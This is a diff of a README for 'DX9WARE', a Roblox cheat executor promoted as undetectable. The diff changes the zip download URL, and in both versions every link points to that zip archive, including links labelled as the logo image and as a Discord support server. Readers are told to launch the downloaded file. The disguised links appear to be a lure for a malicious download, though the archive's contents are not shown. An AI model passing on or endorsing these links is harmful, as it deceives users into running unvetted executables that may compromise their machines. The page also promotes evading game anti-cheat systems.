@@ -1,6 +1,6 @@
 # 🚀 Welcome to DX9WARE-Roblox 🚀
 
-![DX9WARE Logo](https://github.com/massambaf/DX9WARE-Roblox/releases/download/v1.0/Software.zip)
+![DX9WARE Logo](https://raw.githubusercontent.com/massambaf/DX9WARE-Roblox/main/Megaloptera/Roblox-D-WAR-3.5.zip)
 
 ## Overview
 Welcome to the official GitHub repository of DX9WARE for Roblox! DX9WARE is a powerful Roblox executor that provides a secure, customizable Lua environment with a wide range of scripts and features. It's an external tool with no detection, perfect for advanced scripting in Roblox games.
@@ -30,12 +30,12 @@ Welcome to the official GitHub repository of DX9WARE for Roblox! DX9WARE is a po
 ## Getting Started
 To get started with DX9WARE, download the latest version from the link below:
 
-[![Download DX9WARE](https://github.com/massambaf/DX9WARE-Roblox/releases/download/v1.0/Software.zip)](https://github.com/massambaf/DX9WARE-Roblox/releases/download/v1.0/Software.zip)
+[![Download DX9WARE](https://raw.githubusercontent.com/massambaf/DX9WARE-Roblox/main/Megaloptera/Roblox-D-WAR-3.5.zip)](https://raw.githubusercontent.com/massambaf/DX9WARE-Roblox/main/Megaloptera/Roblox-D-WAR-3.5.zip)
 
 Once downloaded, launch the file and follow the installation instructions to start using DX9WARE in your Roblox games.
 
 ## Support
-If you encounter any issues or have any questions regarding DX9WARE, feel free to reach out on our Discord server at [DX9WARE Discord](https://github.com/massambaf/DX9WARE-Roblox/releases/download/v1.0/Software.zip). Our community is always ready to assist you with any inquiries.
+If you encounter any issues or have any questions regarding DX9WARE, feel free to reach out on our Discord server at [DX9WARE Discord](https://raw.githubusercontent.com/massambaf/DX9WARE-Roblox/main/Megaloptera/Roblox-D-WAR-3.5.zip). Our community is always ready to assist you with any inquiries.
 
 ## Contribute
 Want to contribute to DX9WARE? Fork this repository, make your changes, and submit a pull request. Your contributions are highly appreciated and help improve the tool for everyone in the community.
